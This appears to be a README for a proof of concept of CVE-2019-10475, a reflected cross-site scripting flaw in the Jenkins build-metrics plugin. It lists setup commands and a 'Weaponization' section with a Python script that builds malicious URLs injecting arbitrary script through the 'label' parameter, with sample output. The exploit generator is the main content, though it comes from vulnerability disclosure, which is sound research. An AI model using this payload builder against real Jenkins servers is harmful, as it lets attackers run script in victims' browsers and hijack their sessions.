# CVE-2019-10475

Quick POC for Jenkins [CVE-2019-10475](https://nvd.nist.gov/vuln/detail/CVE-2019-10475) / [SECURITY-1490](https://jenkins.io/security/advisory/2019-10-23/#SECURITY-1490) reported on 2019-10-23. The issue is within the [build-metrics](https://plugins.jenkins.io/build-metrics) plugin which generates some basic build metrics. It's commonly used with the Jenkins sidebar links plugin.

This is a simple & generic reflected XSS vulnerability. The issue is that the plugin does not properly escape the `label` query parameter.

![0](scrots/0.png)

## Setup

POC was done on Debian 10 (Buster), Jenkins 2.203 (latest 2019-11-05), and build-metrics 1.3.

```bash
# install jenkins
sudo apt-get install daemon psmisc net-tools openjdk-11-jre
wget -q -O - https://pkg.jenkins.io/debian/jenkins.io.key | sudo apt-key add -
wget https://pkg.jenkins.io/debian/binary/jenkins_2.203_all.deb
dpkg -i jenkins_2.203_all.deb
sudo systemctl status jenkins
# activate using admin password
sudo cat /var/lib/jenkins/secrets/initialAdminPassword
# get jenkins cli
wget http://localhost:8080/jnlpJars/jenkins-cli.jar
# install plugins
java -jar ./jenkins-cli.jar -s "http://localhost:8080" -auth admin:password -noKeyAuth install-plugin global-build-stats -restart
java -jar ./jenkins-cli.jar -s "http://localhost:8080" -auth admin:password -noKeyAuth install-plugin build-metrics -restart
```

## Exploit POC

The vulnearble plugin can be found at `http://localhost:8080/plugin/build-metrics/`, the vulnerable parameter is `label`. We can inject a simple script like so:

![1](scrots/1.png)

## Weaponization

See `CVE-2019-10475.py`, it can be used to build malicious payloads:

```python
#!/usr/bin/env python

import sys
import argparse

VULN_URL = '''{base_url}/plugin/build-metrics/getBuildStats?label={inject}&range=2&rangeUnits=Weeks&jobFilteringType=ALL&jobFilter=&nodeFilteringType=ALL&nodeFilter=&launcherFilteringType=ALL&launcherFilter=&causeFilteringType=ALL&causeFilter=&Jenkins-Crumb=4412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96&json=%7B%22label%22%3A+%22Search+Results%22%2C+%22range%22%3A+%222%22%2C+%22rangeUnits%22%3A+%22Weeks%22%2C+%22jobFilteringType%22%3A+%22ALL%22%2C+%22jobNameRegex%22%3A+%22%22%2C+%22jobFilter%22%3A+%22%22%2C+%22nodeFilteringType%22%3A+%22ALL%22%2C+%22nodeNameRegex%22%3A+%22%22%2C+%22nodeFilter%22%3A+%22%22%2C+%22launcherFilteringType%22%3A+%22ALL%22%2C+%22launcherNameRegex%22%3A+%22%22%2C+%22launcherFilter%22%3A+%22%22%2C+%22causeFilteringType%22%3A+%22ALL%22%2C+%22causeNameRegex%22%3A+%22%22%2C+%22causeFilter%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%224412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96%22%7D&Submit=Search'''


def get_parser():
    parser = argparse.ArgumentParser(description='CVE-2019-10475')
    parser.add_argument('-p', '--port', help='port', default=80, type=int)
    parser.add_argument('-d', '--domain', help='domain', default='localhost', type=str)
    parser.add_argument('-i', '--inject', help='inject', default='<script>alert("CVE-2019-10475")</script>', type=str)
    return parser


def main():
    parser = get_parser()
    args = vars(parser.parse_args())
    port = args['port']
    domain = args['domain']
    inject = args['inject']
    if port == 80:
        base_url = f'http://{domain}'
    elif port == 443:
        base_url = f'https://{domain}'
    else:
        base_url = f'http://{domain}:{port}'
    build_url = VULN_URL.format(base_url=base_url, inject=inject)
    print(build_url)
    return 0


if __name__ == '__main__':
    sys.exit(main())
```

Usage:
```
$ python3 CVE-2019-10475.py --help
usage: CVE-2019-10475.py [-h] [-p PORT] [-d DOMAIN] [-i INJECT]

CVE-2019-10475

optional arguments:
  -h, --help            show this help message and exit
  -p PORT, --port PORT  port
  -d DOMAIN, --domain DOMAIN
                        domain
  -i INJECT, --inject INJECT
                        inject

$ python3 CVE-2019-10475.py -p 8080 -d 192.168.1.75
http://192.168.1.75:8080/plugin/build-metrics/getBuildStats?label=<script>alert("CVE-2019-10475")</script>&range=2&rangeUnits=Weeks&jobFilteringType=ALL&jobFilter=&nodeFilteringType=ALL&nodeFilter=&launcherFilteringType=ALL&launcherFilter=&causeFilteringType=ALL&causeFilter=&Jenkins-Crumb=4412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96&json=%7B%22label%22%3A+%22Search+Results%22%2C+%22range%22%3A+%222%22%2C+%22rangeUnits%22%3A+%22Weeks%22%2C+%22jobFilteringType%22%3A+%22ALL%22%2C+%22jobNameRegex%22%3A+%22%22%2C+%22jobFilter%22%3A+%22%22%2C+%22nodeFilteringType%22%3A+%22ALL%22%2C+%22nodeNameRegex%22%3A+%22%22%2C+%22nodeFilter%22%3A+%22%22%2C+%22launcherFilteringType%22%3A+%22ALL%22%2C+%22launcherNameRegex%22%3A+%22%22%2C+%22launcherFilter%22%3A+%22%22%2C+%22causeFilteringType%22%3A+%22ALL%22%2C+%22causeNameRegex%22%3A+%22%22%2C+%22causeFilter%22%3A+%22%22%2C+%22Jenkins-Crumb%22%3A+%224412200a345e2a8cad31f07e8a09e18be6b7ee12b1b6b917bc01a334e0f20a96%22%7D&Submit=Search
```
